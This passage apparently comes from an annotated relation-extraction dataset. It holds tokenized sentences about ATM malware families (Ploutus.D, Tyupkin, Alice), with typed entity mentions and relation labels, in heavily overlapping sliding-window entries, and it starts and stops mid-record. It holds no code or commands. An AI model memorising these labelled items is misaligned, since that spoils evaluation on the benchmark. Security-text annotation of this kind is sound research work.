0, "t": 1}, {"r": "WR", "evidence": [0], "h": 0, "t": 2}, {"r": "WR", "evidence": [0], "h": 1, "t": 2}, {"r": "RD", "evidence": [0, 1], "t": 2, "h": 3}, {"r": "CO", "evidence": [1, 2], "h": 3, "t": 4}, {"r": "CO", "evidence": [1, 2, 3, 4, 5, 6, 7], "h": 3, "t": 17}, {"r": "WR", "evidence": [2], "h": 4, "t": 5}, {"r": "RD", "evidence": [2], "t": 5, "h": 6}, {"r": "EX", "evidence": [2], "t": 5, "h": 6}, {"r": "RD", "evidence": [2], "h": 4, "t": 7}, {"r": "FR", "evidence": [2, 3, 4], "h": 6, "t": 9}, {"r": "RD", "evidence": [2, 3], "t": 5, "h": 8}, {"r": "EX", "evidence": [2, 3], "t": 5, "h": 8}, {"r": "ST", "evidence": [4], "h": 9, "t": 10}, {"r": "RF", "evidence": [4], "h": 9, "t": 10}, {"r": "FR", "evidence": [4], "h": 9, "t": 11}, {"r": "WR", "evidence": [4], "h": 9, "t": 12}, {"r": "RD", "evidence": [4, 5], "h": 11, "t": 13}, {"r": "WR", "evidence": [4, 5], "h": 11, "t": 13}, {"r": "EX", "evidence": [4, 5], "h": 11, "t": 13}, {"r": "WR", "evidence": [5], "t": 13, "h": 14}, {"r": "WR", "evidence": [5], "t": 13, "h": 14}, {"r": "WR", "evidence": [5, 6], "h": 14, "t": 16}, {"r": "WR", "evidence": [5], "t": 13, "h": 15}, {"r": "WR", "evidence": [5, 6], "h": 15, "t": 16}, {"r": "WR", "evidence": [5, 6], "h": 15, "t": 16}, {"r": "WR", "evidence": [6, 7], "t": 16, "h": 17}, {"r": "WR", "evidence": [6, 7], "t": 16, "h": 17}, {"r": "ST", "evidence": [7], "h": 17, "t": 18}, {"r": "RF", "evidence": [7], "h": 17, "t": 18}, {"r": "ST", "evidence": [7], "h": 17, "t": 18}, {"r": "RF", "evidence": [7], "h": 17, "t": 18}]}, {"title": "651-2", "sents": [["The", "first", "one", "requires", "the", "attacker", "to", "physically", "access", "the", "device", "."], ["The", "second", "group", "assumes", "that", "the", "attacker", "installs", "malware", "indirectly", ",", "typically", "by", "compromising", "the", "internal", "network", "of", "the", "bank", "and", "then", "targeting", "ATMs", "using", "stolen", "credentials", "."], ["Most", "ATM", "samples", "require", "physical", "access", "to", "the", "targeted", "ATM", "."], ["The", "attackers", "need", "to", "be", "able", "to", "access", "physical", "ports", "or", "a", "CD-ROM", "drive", "to", "be", "able", "to", "boot", "from", "it", "and", "modify", "the", "ATM", "system", "image", "to", "install", "the", "malware", "."], ["Ploutus.D", "communicates", "with", "the", "ATM", "using", "the", "multi-vendor", "KAL", "Kalignite", "framework", ",", "which", "allows", "it", "to", "work", "with", "ATMs", "from", "different", "vendors", "with", "minimal", "changes", "to", "its", "code", "base", "."], ["If", "the", "user", "knows", "the", "secret", "code", "to", "activate", "the", "backdoor", ",", "the", "malware", "displays", "a", "menu", ",", "which", "allows", "the", "operator", "to", "empty", "one", "of", "the", "four", "cash-dispensing", "modules", "(", "CDMs", ")", "."], ["The", "attackers", "need", "to", "be", "able", "to", "physically", "access", "the", "ATM", ",", "which", "requires", "a", "key", "or", "drilling", "a", "hole", "to", "access", "specific", "ports", "or", "devices", "."], ["Once", "the", "malware", "is", "deployed", ",", "the", "money", "mules", "need", "a", "specific", "code", "to", "access", "the", "menu", "and", "dispense", "cash", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [5, 5], "name": "attacker", "pos": [5, 6], "index": "0_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [18, 18], "name": "attacker", "pos": [6, 7], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [20, 20], "name": "malware", "pos": [8, 9], "index": "2_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [35, 35], "name": "ATMs", "pos": [23, 24], "index": "3_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [38, 38], "name": "credentials", "pos": [26, 27], "index": "4_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [41, 41], "name": "ATM", "pos": [1, 2], "index": "5_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [52, 52], "name": "attackers", "pos": [1, 2], "index": "6_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [60, 60], "name": "ports", "pos": [9, 10], "index": "7_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [75, 75], "name": "ATM", "pos": [24, 25], "index": "8_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [81, 81], "name": "malware", "pos": [30, 31], "index": "9_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [83, 83], "name": "Ploutus.D", "pos": [0, 1], "index": "10_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [87, 87], "name": "ATM", "pos": [4, 5], "index": "11_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [101, 101], "name": "ATMs", "pos": [18, 19], "index": "12_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [126, 126], "name": "malware", "pos": [13, 14], "index": "13_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [148, 148], "name": "attackers", "pos": [1, 2], "index": "14_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [170, 170], "name": "ports", "pos": [23, 24], "index": "15_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [176, 176], "name": "malware", "pos": [2, 3], "index": "16_0"}]], "labels": [{"r": "CO", "evidence": [0, 1], "h": 0, "t": 1}, {"r": "CO", "evidence": [0, 1, 2, 3, 4, 5, 6], "h": 0, "t": 14}, {"r": "WR", "evidence": [1], "h": 1, "t": 2}, {"r": "RD", "evidence": [1], "t": 2, "h": 3}, {"r": "EX", "evidence": [1], "t": 2, "h": 3}, {"r": "RD", "evidence": [1], "h": 1, "t": 4}, {"r": "FR", "evidence": [1, 2, 3], "h": 3, "t": 6}, {"r": "RD", "evidence": [1, 2], "t": 2, "h": 5}, {"r": "EX", "evidence": [1, 2], "t": 2, "h": 5}, {"r": "ST", "evidence": [3], "h": 6, "t": 7}, {"r": "RF", "evidence": [3], "h": 6, "t": 7}, {"r": "FR", "evidence": [3], "h": 6, "t": 8}, {"r": "WR", "evidence": [3], "h": 6, "t": 9}, {"r": "RD", "evidence": [3, 4], "h": 8, "t": 10}, {"r": "WR", "evidence": [3, 4], "h": 8, "t": 10}, {"r": "EX", "evidence": [3, 4], "h": 8, "t": 10}, {"r": "WR", "evidence": [4], "t": 10, "h": 11}, {"r": "WR", "evidence": [4], "t": 10, "h": 11}, {"r": "WR", "evidence": [4, 5], "h": 11, "t": 13}, {"r": "WR", "evidence": [4], "t": 10, "h": 12}, {"r": "WR", "evidence": [4, 5], "h": 12, "t": 13}, {"r": "WR", "evidence": [4, 5], "h": 12, "t": 13}, {"r": "WR", "evidence": [5, 6], "t": 13, "h": 14}, {"r": "WR", "evidence": [5, 6], "t": 13, "h": 14}, {"r": "ST", "evidence": [6], "h": 14, "t": 15}, {"r": "RF", "evidence": [6], "h": 14, "t": 15}, {"r": "ST", "evidence": [6], "h": 14, "t": 15}, {"r": "RF", "evidence": [6], "h": 14, "t": 15}, {"r": "WR", "evidence": [6, 7], "h": 14, "t": 16}]}, {"title": "651-3", "sents": [["The", "second", "group", "assumes", "that", "the", "attacker", "installs", "malware", "indirectly", ",", "typically", "by", "compromising", "the", "internal", "network", "of", "the", "bank", "and", "then", "targeting", "ATMs", "using", "stolen", "credentials", "."], ["Most", "ATM", "samples", "require", "physical", "access", "to", "the", "targeted", "ATM", "."], ["The", "attackers", "need", "to", "be", "able", "to", "access", "physical", "ports", "or", "a", "CD-ROM", "drive", "to", "be", "able", "to", "boot", "from", "it", "and", "modify", "the", "ATM", "system", "image", "to", "install", "the", "malware", "."], ["Ploutus.D", "communicates", "with", "the", "ATM", "using", "the", "multi-vendor", "KAL", "Kalignite", "framework", ",", "which", "allows", "it", "to", "work", "with", "ATMs", "from", "different", "vendors", "with", "minimal", "changes", "to", "its", "code", "base", "."], ["If", "the", "user", "knows", "the", "secret", "code", "to", "activate", "the", "backdoor", ",", "the", "malware", "displays", "a", "menu", ",", "which", "allows", "the", "operator", "to", "empty", "one", "of", "the", "four", "cash-dispensing", "modules", "(", "CDMs", ")", "."], ["The", "attackers", "need", "to", "be", "able", "to", "physically", "access", "the", "ATM", ",", "which", "requires", "a", "key", "or", "drilling", "a", "hole", "to", "access", "specific", "ports", "or", "devices", "."], ["Once", "the", "malware", "is", "deployed", ",", "the", "money", "mules", "need", "a", "specific", "code", "to", "access", "the", "menu", "and", "dispense", "cash", "."], ["Before", "dispensing", "cash", ",", "Tyupkin", "disables", "any", "network", "connections", ",", "presumably", "to", "prevent", "administrators", "from", "shutting", "down", "the", "ATM", "if", "a", "suspicious", "activity", "is", "detected", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [6, 6], "name": "attacker", "pos": [6, 7], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [8, 8], "name": "malware", "pos": [8, 9], "index": "1_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [23, 23], "name": "ATMs", "pos": [23, 24], "index": "2_0"}], [{"type": "TF", "sent_id": 0, "global_pos": [26, 26], "name": "credentials", "pos": [26, 27], "index": "3_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [29, 29], "name": "ATM", "pos": [1, 2], "index": "4_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [40, 40], "name": "attackers", "pos": [1, 2], "index": "5_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [48, 48], "name": "ports", "pos": [9, 10], "index": "6_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [63, 63], "name": "ATM", "pos": [24, 25], "index": "7_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [69, 69], "name": "malware", "pos": [30, 31], "index": "8_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [71, 71], "name": "Ploutus.D", "pos": [0, 1], "index": "9_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [75, 75], "name": "ATM", "pos": [4, 5], "index": "10_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [89, 89], "name": "ATMs", "pos": [18, 19], "index": "11_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [114, 114], "name": "malware", "pos": [13, 14], "index": "12_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [136, 136], "name": "attackers", "pos": [1, 2], "index": "13_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [158, 158], "name": "ports", "pos": [23, 24], "index": "14_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [164, 164], "name": "malware", "pos": [2, 3], "index": "15_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [187, 187], "name": "Tyupkin", "pos": [4, 5], "index": "16_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [190, 190], "name": "network connections", "pos": [7, 9], "index": "17_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [201, 201], "name": "ATM", "pos": [18, 19], "index": "18_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "RD", "evidence": [0], "t": 1, "h": 2}, {"r": "EX", "evidence": [0], "t": 1, "h": 2}, {"r": "RD", "evidence": [0], "h": 0, "t": 3}, {"r": "FR", "evidence": [0, 1, 2], "h": 2, "t": 5}, {"r": "RD", "evidence": [0, 1], "t": 1, "h": 4}, {"r": "EX", "evidence": [0, 1], "t": 1, "h": 4}, {"r": "ST", "evidence": [2], "h": 5, "t": 6}, {"r": "RF", "evidence": [2], "h": 5, "t": 6}, {"r": "FR", "evidence": [2], "h": 5, "t": 7}, {"r": "WR", "evidence": [2], "h": 5, "t": 8}, {"r": "RD", "evidence": [2, 3], "h": 7, "t": 9}, {"r": "WR", "evidence": [2, 3], "h": 7, "t": 9}, {"r": "EX", "evidence": [2, 3], "h": 7, "t": 9}, {"r": "WR", "evidence": [3], "t": 9, "h": 10}, {"r": "WR", "evidence": [3], "t": 9, "h": 10}, {"r": "WR", "evidence": [3, 4], "h": 10, "t": 12}, {"r": "WR", "evidence": [3], "t": 9, "h": 11}, {"r": "WR", "evidence": [3, 4], "h": 11, "t": 12}, {"r": "WR", "evidence": [3, 4], "h": 11, "t": 12}, {"r": "WR", "evidence": [4, 5], "t": 12, "h": 13}, {"r": "WR", "evidence": [4, 5], "t": 12, "h": 13}, {"r": "ST", "evidence": [5], "h": 13, "t": 14}, {"r": "RF", "evidence": [5], "h": 13, "t": 14}, {"r": "ST", "evidence": [5], "h": 13, "t": 14}, {"r": "RF", "evidence": [5], "h": 13, "t": 14}, {"r": "WR", "evidence": [5, 6], "h": 13, "t": 15}, {"r": "ST", "evidence": [5, 6, 7], "t": 14, "h": 16}, {"r": "RF", "evidence": [5, 6, 7], "t": 14, "h": 16}, {"r": "WR", "evidence": [6, 7], "t": 15, "h": 16}, {"r": "UK", "evidence": [7], "h": 16, "t": 17}, {"r": "FR", "evidence": [7], "h": 16, "t": 18}]}, {"title": "651-4", "sents": [["Most", "ATM", "samples", "require", "physical", "access", "to", "the", "targeted", "ATM", "."], ["The", "attackers", "need", "to", "be", "able", "to", "access", "physical", "ports", "or", "a", "CD-ROM", "drive", "to", "be", "able", "to", "boot", "from", "it", "and", "modify", "the", "ATM", "system", "image", "to", "install", "the", "malware", "."], ["Ploutus.D", "communicates", "with", "the", "ATM", "using", "the", "multi-vendor", "KAL", "Kalignite", "framework", ",", "which", "allows", "it", "to", "work", "with", "ATMs", "from", "different", "vendors", "with", "minimal", "changes", "to", "its", "code", "base", "."], ["If", "the", "user", "knows", "the", "secret", "code", "to", "activate", "the", "backdoor", ",", "the", "malware", "displays", "a", "menu", ",", "which", "allows", "the", "operator", "to", "empty", "one", "of", "the", "four", "cash-dispensing", "modules", "(", "CDMs", ")", "."], ["The", "attackers", "need", "to", "be", "able", "to", "physically", "access", "the", "ATM", ",", "which", "requires", "a", "key", "or", "drilling", "a", "hole", "to", "access", "specific", "ports", "or", "devices", "."], ["Once", "the", "malware", "is", "deployed", ",", "the", "money", "mules", "need", "a", "specific", "code", "to", "access", "the", "menu", "and", "dispense", "cash", "."], ["Before", "dispensing", "cash", ",", "Tyupkin", "disables", "any", "network", "connections", ",", "presumably", "to", "prevent", "administrators", "from", "shutting", "down", "the", "ATM", "if", "a", "suspicious", "activity", "is", "detected", "."], ["Some", "members", "of", "Tyupkin", "family", "are", "developed", "using", "C", "#", "and", "the", "."]], "vertexSet": [[{"type": "TP", "sent_id": 0, "global_pos": [1, 1], "name": "ATM", "pos": [1, 2], "index": "0_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [12, 12], "name": "attackers", "pos": [1, 2], "index": "1_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [20, 20], "name": "ports", "pos": [9, 10], "index": "2_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [35, 35], "name": "ATM", "pos": [24, 25], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [41, 41], "name": "malware", "pos": [30, 31], "index": "4_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [43, 43], "name": "Ploutus.D", "pos": [0, 1], "index": "5_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [47, 47], "name": "ATM", "pos": [4, 5], "index": "6_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [61, 61], "name": "ATMs", "pos": [18, 19], "index": "7_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [86, 86], "name": "malware", "pos": [13, 14], "index": "8_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [108, 108], "name": "attackers", "pos": [1, 2], "index": "9_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [130, 130], "name": "ports", "pos": [23, 24], "index": "10_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [136, 136], "name": "malware", "pos": [2, 3], "index": "11_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [159, 159], "name": "Tyupkin", "pos": [4, 5], "index": "12_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [162, 162], "name": "network connections", "pos": [7, 9], "index": "13_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [173, 173], "name": "ATM", "pos": [18, 19], "index": "14_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [184, 184], "name": "Tyupkin", "pos": [3, 4], "index": "15_0"}]], "labels": [{"r": "ST", "evidence": [1], "h": 1, "t": 2}, {"r": "RF", "evidence": [1], "h": 1, "t": 2}, {"r": "FR", "evidence": [1], "h": 1, "t": 3}, {"r": "WR", "evidence": [1], "h": 1, "t": 4}, {"r": "RD", "evidence": [1, 2], "h": 3, "t": 5}, {"r": "WR", "evidence": [1, 2], "h": 3, "t": 5}, {"r": "EX", "evidence": [1, 2], "h": 3, "t": 5}, {"r": "WR", "evidence": [2], "t": 5, "h": 6}, {"r": "WR", "evidence": [2], "t": 5, "h": 6}, {"r": "WR", "evidence": [2, 3], "h": 6, "t": 8}, {"r": "WR", "evidence": [2], "t": 5, "h": 7}, {"r": "WR", "evidence": [2, 3], "h": 7, "t": 8}, {"r": "WR", "evidence": [2, 3], "h": 7, "t": 8}, {"r": "WR", "evidence": [3, 4], "t": 8, "h": 9}, {"r": "WR", "evidence": [3, 4], "t": 8, "h": 9}, {"r": "ST", "evidence": [4], "h": 9, "t": 10}, {"r": "RF", "evidence": [4], "h": 9, "t": 10}, {"r": "ST", "evidence": [4], "h": 9, "t": 10}, {"r": "RF", "evidence": [4], "h": 9, "t": 10}, {"r": "WR", "evidence": [4, 5], "h": 9, "t": 11}, {"r": "ST", "evidence": [4, 5, 6], "t": 10, "h": 12}, {"r": "RF", "evidence": [4, 5, 6], "t": 10, "h": 12}, {"r": "WR", "evidence": [5, 6], "t": 11, "h": 12}, {"r": "UK", "evidence": [6], "h": 12, "t": 13}, {"r": "FR", "evidence": [6], "h": 12, "t": 14}, {"r": "FR", "evidence": [6, 7], "h": 14, "t": 15}]}, {"title": "651-5", "sents": [["The", "attackers", "need", "to", "be", "able", "to", "access", "physical", "ports", "or", "a", "CD-ROM", "drive", "to", "be", "able", "to", "boot", "from", "it", "and", "modify", "the", "ATM", "system", "image", "to", "install", "the", "malware", "."], ["Ploutus.D", "communicates", "with", "the", "ATM", "using", "the", "multi-vendor", "KAL", "Kalignite", "framework", ",", "which", "allows", "it", "to", "work", "with", "ATMs", "from", "different", "vendors", "with", "minimal", "changes", "to", "its", "code", "base", "."], ["If", "the", "user", "knows", "the", "secret", "code", "to", "activate", "the", "backdoor", ",", "the", "malware", "displays", "a", "menu", ",", "which", "allows", "the", "operator", "to", "empty", "one", "of", "the", "four", "cash-dispensing", "modules", "(", "CDMs", ")", "."], ["The", "attackers", "need", "to", "be", "able", "to", "physically", "access", "the", "ATM", ",", "which", "requires", "a", "key", "or", "drilling", "a", "hole", "to", "access", "specific", "ports", "or", "devices", "."], ["Once", "the", "malware", "is", "deployed", ",", "the", "money", "mules", "need", "a", "specific", "code", "to", "access", "the", "menu", "and", "dispense", "cash", "."], ["Before", "dispensing", "cash", ",", "Tyupkin", "disables", "any", "network", "connections", ",", "presumably", "to", "prevent", "administrators", "from", "shutting", "down", "the", "ATM", "if", "a", "suspicious", "activity", "is", "detected", "."], ["Some", "members", "of", "Tyupkin", "family", "are", "developed", "using", "C", "#", "and", "the", "."], ["It", "is", "installed", "by", "attackers", "and", "requires", "physical", "access", "to", "the", "system", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "attackers", "pos": [1, 2], "index": "0_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [9, 9], "name": "ports", "pos": [9, 10], "index": "1_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [24, 24], "name": "ATM", "pos": [24, 25], "index": "2_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [30, 30], "name": "malware", "pos": [30, 31], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [32, 32], "name": "Ploutus.D", "pos": [0, 1], "index": "4_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [36, 36], "name": "ATM", "pos": [4, 5], "index": "5_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [50, 50], "name": "ATMs", "pos": [18, 19], "index": "6_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [75, 75], "name": "malware", "pos": [13, 14], "index": "7_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [97, 97], "name": "attackers", "pos": [1, 2], "index": "8_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [119, 119], "name": "ports", "pos": [23, 24], "index": "9_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [125, 125], "name": "malware", "pos": [2, 3], "index": "10_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [148, 148], "name": "Tyupkin", "pos": [4, 5], "index": "11_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [151, 151], "name": "network connections", "pos": [7, 9], "index": "12_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [162, 162], "name": "ATM", "pos": [18, 19], "index": "13_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [173, 173], "name": "Tyupkin", "pos": [3, 4], "index": "14_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [183, 183], "name": "It", "pos": [0, 1], "index": "15_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [187, 187], "name": "attackers", "pos": [4, 5], "index": "16_0"}]], "labels": [{"r": "ST", "evidence": [0], "h": 0, "t": 1}, {"r": "RF", "evidence": [0], "h": 0, "t": 1}, {"r": "FR", "evidence": [0], "h": 0, "t": 2}, {"r": "WR", "evidence": [0], "h": 0, "t": 3}, {"r": "RD", "evidence": [0, 1], "h": 2, "t": 4}, {"r": "WR", "evidence": [0, 1], "h": 2, "t": 4}, {"r": "EX", "evidence": [0, 1], "h": 2, "t": 4}, {"r": "WR", "evidence": [1], "t": 4, "h": 5}, {"r": "WR", "evidence": [1], "t": 4, "h": 5}, {"r": "WR", "evidence": [1, 2], "h": 5, "t": 7}, {"r": "WR", "evidence": [1], "t": 4, "h": 6}, {"r": "WR", "evidence": [1, 2], "h": 6, "t": 7}, {"r": "WR", "evidence": [1, 2], "h": 6, "t": 7}, {"r": "WR", "evidence": [2, 3], "t": 7, "h": 8}, {"r": "WR", "evidence": [2, 3], "t": 7, "h": 8}, {"r": "ST", "evidence": [3], "h": 8, "t": 9}, {"r": "RF", "evidence": [3], "h": 8, "t": 9}, {"r": "ST", "evidence": [3], "h": 8, "t": 9}, {"r": "RF", "evidence": [3], "h": 8, "t": 9}, {"r": "WR", "evidence": [3, 4], "h": 8, "t": 10}, {"r": "ST", "evidence": [3, 4, 5], "t": 9, "h": 11}, {"r": "RF", "evidence": [3, 4, 5], "t": 9, "h": 11}, {"r": "WR", "evidence": [4, 5], "t": 10, "h": 11}, {"r": "UK", "evidence": [5], "h": 11, "t": 12}, {"r": "FR", "evidence": [5], "h": 11, "t": 13}, {"r": "FR", "evidence": [5, 6], "h": 13, "t": 14}, {"r": "WR", "evidence": [7], "t": 15, "h": 16}]}, {"title": "651-6", "sents": [["Ploutus.D", "communicates", "with", "the", "ATM", "using", "the", "multi-vendor", "KAL", "Kalignite", "framework", ",", "which", "allows", "it", "to", "work", "with", "ATMs", "from", "different", "vendors", "with", "minimal", "changes", "to", "its", "code", "base", "."], ["If", "the", "user", "knows", "the", "secret", "code", "to", "activate", "the", "backdoor", ",", "the", "malware", "displays", "a", "menu", ",", "which", "allows", "the", "operator", "to", "empty", "one", "of", "the", "four", "cash-dispensing", "modules", "(", "CDMs", ")", "."], ["The", "attackers", "need", "to", "be", "able", "to", "physically", "access", "the", "ATM", ",", "which", "requires", "a", "key", "or", "drilling", "a", "hole", "to", "access", "specific", "ports", "or", "devices", "."], ["Once", "the", "malware", "is", "deployed", ",", "the", "money", "mules", "need", "a", "specific", "code", "to", "access", "the", "menu", "and", "dispense", "cash", "."], ["Before", "dispensing", "cash", ",", "Tyupkin", "disables", "any", "network", "connections", ",", "presumably", "to", "prevent", "administrators", "from", "shutting", "down", "the", "ATM", "if", "a", "suspicious", "activity", "is", "detected", "."], ["Some", "members", "of", "Tyupkin", "family", "are", "developed", "using", "C", "#", "and", "the", "."], ["It", "is", "installed", "by", "attackers", "and", "requires", "physical", "access", "to", "the", "system", "."], ["When", "the", "operator", "launches", "it", ",", "Alice", "displays", "a", "window", "requiring", "a", "PIN", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [0, 0], "name": "Ploutus.D", "pos": [0, 1], "index": "0_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [4, 4], "name": "ATM", "pos": [4, 5], "index": "1_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [18, 18], "name": "ATMs", "pos": [18, 19], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [43, 43], "name": "malware", "pos": [13, 14], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [65, 65], "name": "attackers", "pos": [1, 2], "index": "4_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [87, 87], "name": "ports", "pos": [23, 24], "index": "5_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [93, 93], "name": "malware", "pos": [2, 3], "index": "6_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [116, 116], "name": "Tyupkin", "pos": [4, 5], "index": "7_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [119, 119], "name": "network connections", "pos": [7, 9], "index": "8_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [130, 130], "name": "ATM", "pos": [18, 19], "index": "9_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [141, 141], "name": "Tyupkin", "pos": [3, 4], "index": "10_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [151, 151], "name": "It", "pos": [0, 1], "index": "11_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [155, 155], "name": "attackers", "pos": [4, 5], "index": "12_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [170, 170], "name": "Alice", "pos": [6, 7], "index": "13_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [176, 176], "name": "PIN", "pos": [12, 13], "index": "14_0"}]], "labels": [{"r": "WR", "evidence": [0], "t": 0, "h": 1}, {"r": "WR", "evidence": [0], "t": 0, "h": 1}, {"r": "WR", "evidence": [0, 1], "h": 1, "t": 3}, {"r": "WR", "evidence": [0], "t": 0, "h": 2}, {"r": "WR", "evidence": [0, 1], "h": 2, "t": 3}, {"r": "WR", "evidence": [0, 1], "h": 2, "t": 3}, {"r": "WR", "evidence": [1, 2], "t": 3, "h": 4}, {"r": "WR", "evidence": [1, 2], "t": 3, "h": 4}, {"r": "ST", "evidence": [2], "h": 4, "t": 5}, {"r": "RF", "evidence": [2], "h": 4, "t": 5}, {"r": "ST", "evidence": [2], "h": 4, "t": 5}, {"r": "RF", "evidence": [2], "h": 4, "t": 5}, {"r": "WR", "evidence": [2, 3], "h": 4, "t": 6}, {"r": "ST", "evidence": [2, 3, 4], "t": 5, "h": 7}, {"r": "RF", "evidence": [2, 3, 4], "t": 5, "h": 7}, {"r": "WR", "evidence": [3, 4], "t": 6, "h": 7}, {"r": "UK", "evidence": [4], "h": 7, "t": 8}, {"r": "FR", "evidence": [4], "h": 7, "t": 9}, {"r": "FR", "evidence": [4, 5], "h": 9, "t": 10}, {"r": "WR", "evidence": [6], "t": 11, "h": 12}, {"r": "CO", "evidence": [6, 7], "h": 11, "t": 13}, {"r": "EX", "evidence": [7], "t": 13, "h": 14}]}, {"title": "651-7", "sents": [["If", "the", "user", "knows", "the", "secret", "code", "to", "activate", "the", "backdoor", ",", "the", "malware", "displays", "a", "menu", ",", "which", "allows", "the", "operator", "to", "empty", "one", "of", "the", "four", "cash-dispensing", "modules", "(", "CDMs", ")", "."], ["The", "attackers", "need", "to", "be", "able", "to", "physically", "access", "the", "ATM", ",", "which", "requires", "a", "key", "or", "drilling", "a", "hole", "to", "access", "specific", "ports", "or", "devices", "."], ["Once", "the", "malware", "is", "deployed", ",", "the", "money", "mules", "need", "a", "specific", "code", "to", "access", "the", "menu", "and", "dispense", "cash", "."], ["Before", "dispensing", "cash", ",", "Tyupkin", "disables", "any", "network", "connections", ",", "presumably", "to", "prevent", "administrators", "from", "shutting", "down", "the", "ATM", "if", "a", "suspicious", "activity", "is", "detected", "."], ["Some", "members", "of", "Tyupkin", "family", "are", "developed", "using", "C", "#", "and", "the", "."], ["It", "is", "installed", "by", "attackers", "and", "requires", "physical", "access", "to", "the", "system", "."], ["When", "the", "operator", "launches", "it", ",", "Alice", "displays", "a", "window", "requiring", "a", "PIN", "."], ["If", "the", "code", "is", "correct", ",", "Alice", "will", "access", "the", "dispenser", "module", "and", "allow", "the", "operator", "to", "retrieve", "cash", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [13, 13], "name": "malware", "pos": [13, 14], "index": "0_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [35, 35], "name": "attackers", "pos": [1, 2], "index": "1_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [57, 57], "name": "ports", "pos": [23, 24], "index": "2_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [63, 63], "name": "malware", "pos": [2, 3], "index": "3_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [86, 86], "name": "Tyupkin", "pos": [4, 5], "index": "4_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [89, 89], "name": "network connections", "pos": [7, 9], "index": "5_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [100, 100], "name": "ATM", "pos": [18, 19], "index": "6_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [111, 111], "name": "Tyupkin", "pos": [3, 4], "index": "7_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [121, 121], "name": "It", "pos": [0, 1], "index": "8_0"}], [{"type": "MP", "sent_id": 5, "global_pos": 